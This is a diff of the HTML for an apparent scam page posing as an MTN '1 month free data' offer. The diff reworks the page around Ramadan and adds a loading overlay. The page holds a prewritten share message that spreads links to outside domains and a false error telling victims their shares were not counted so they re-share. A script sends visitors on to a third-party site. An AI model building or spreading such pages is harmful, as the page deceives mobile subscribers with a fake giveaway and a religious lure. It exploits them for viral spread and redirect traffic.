@@ -39,7 +39,7 @@
     
     <meta name="og:title" content="ENTER YOUR MTN NUMBER" />
     <meta property="og:description"
-        content="MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS 🎉" />
+        content="MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS FOR THE HOLY MONTH OF RAMADAN 🎉" />
     <meta property="og:image"
         content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPdVqIEAnoPCaviVU2DNaVVHjnyhuzyWpsZ_sjBDKrceIRh-GhjHv1OG_pF-cO3_S5Yw5EOCskhVkXu887-83lcLAnaHBVIMbKGIvfE_T1NL19-q6fDPXZhyN12KRNwCqLGQaB-tcDQZkOAEBxQzW8VY93nFd1XtiD_ffaFOcLBhORBeS3gcfsB6D_iz2G/s320/C9F23421-EC99-40F9-88A4-3403C07A603F.jpeg" />
     <meta property="og:type" content="website" />
@@ -350,13 +350,44 @@ text-align: center;
 background-color: rgb(255, 202, 6);
 }
     </style>
+
+     <style>
+        .loading-gif {
+            max-width: 500px;
+        }
+
+        .pre-loader {
+            position: fixed;
+            z-index: 100; /** make sure this is the highest value compared to all other divs **/
+            top: 0;
+            left: 0;
+            background: #191f26;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            width: 100%;
+        }
+
+        .pre-loader.hidden {
+            animation: fadeOut 5s; /** change to 1s */
+            animation-fill-mode: forwards;
+        }
+
+        @keyframes fadeOut {
+            100% {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+    </style>
     <center>
         
         <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi24KAfeLC3bYLBj2z4gRBH9zns0Q9qIhiKVv_k8czOd3MjhyphenhyphenjoW6clSsSRiOek_MSEn_kU2Q1hAtkiQ3lmzFw1IH3j9YkfgGdwpQozHnxu2aEzny51WpuzEBDB5ZIt7s7k92h1iQthSjXVKd7Pgzwzrn4ZjhwOPInlOeToSG9rkSNSpUGbwtSdEG4TpltL/s1350/580BD936-F087-460D-A787-D65E6FFA35B0.jpeg" alt="Free-Data" style="width: 100%;">
     </center>
 
   <marquee width="100%" direction="left" height="50px">
-THANK YOU FOR CHOOSING MTN
+HAPPY RAMADAN 🌙
 </marquee>
     <div class="A">
         <font color="black">Till Today</font><b></br>
@@ -378,12 +409,15 @@ THANK YOU FOR CHOOSING MTN
 
             <p class="welcome">
                
+<body>
+    <div class='pre-loader'>
+    <img class='loading-gif' alt='loading' src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifU6imEA5AR4yOpDIZA6aEFsy9qKIYGaO1IW5sNnJ-jJAqMghtjDE97m-rA48Bv7ZxXaMu-VxLCVeY_Bdro9-zrFiQdMvjAGflHozZ911ehdkx4R1bUjlV0wn4txczvDTF1S9sFrmuz2u_48CBvBNmDhdCONhXxqZ6-N7yuMj5NgAqPC0ikerVIv_73D_P/s590/7F4C767B-2847-4227-A49D-F9C1DBBA24C1.gif"/>
+</div>
 
 
 
-
-                <span class="amount">Get 1 Month Free Data if your MTN Sim Card is up to a year old 🎉 </span>
-              Select your country and click ACTIVATE then follow instrucion to get your 1 month Free Data Activated<br> <span class="amount"></span> <br/>
+                <span class="amount">RAMADAN MONTH FREE DATA FOR OLD SUBSCRIBERS 🌙 </span>
+              Get 1 Month Free Data This holy Month Of Ramadan if your MTN Sim Card is up to a year old<br> <span class="amount"></span> <br/>
  <center>
 
                     <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
@@ -593,7 +627,7 @@ THANK YOU FOR CHOOSING MTN
 
     
 <script> 
- var text1 = "*MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS 🎉*%0A%0AGet 1 Month Free Data if your MTN Sim Card is up to a year old%0A%0A*HOW OLD IS YOUR SIM CARD*?%0A1 Year Old - 5GB%0A2 Years and above - 10GB%0A5 - 10 Years - 20GB%0A10 Years and above - 50GB  %0A%0A*Check Your Reward Here*👇%0Ahttps://gbamz.com/rward %0A%0A*Get Offer Here*👇%0Ahttps://phivez.org/mtn",
+ var text1 = "*MTN 1 MONTH FREE DATA FOR OLD SUBSCRIBERS THIS ONLY MONTH OF RAMADAN 🎉*%0A%0AGet 1 Month Free Data This holy Month Of Ramadan if your MTN Sim Card is up to a year old%0A%0A*HOW OLD IS YOUR SIM CARD*?%0A1 Year Old - 5GB%0A2 Years and above - 10GB%0A5 - 10 Years - 20GB%0A10 Years and above - 50GB  %0A%0A*Check Your Reward Here*👇%0Ahttps://gbamz.com/rward %0A%0A*Get Offer Here*👇%0Ahttps://phivez.org/mtn",
     text2 = " an amount of ",
     text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
     error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
@@ -615,7 +649,11 @@ THANK YOU FOR CHOOSING MTN
         location.href="https://ey43.com/4/3144603";
     }
 </script>
-
+<script type='text/javascript'>
+    window.addEventListener('load', function () {
+        document.querySelector('.pre-loader').className += ' hidden';
+    });
+</script>
 
 
 
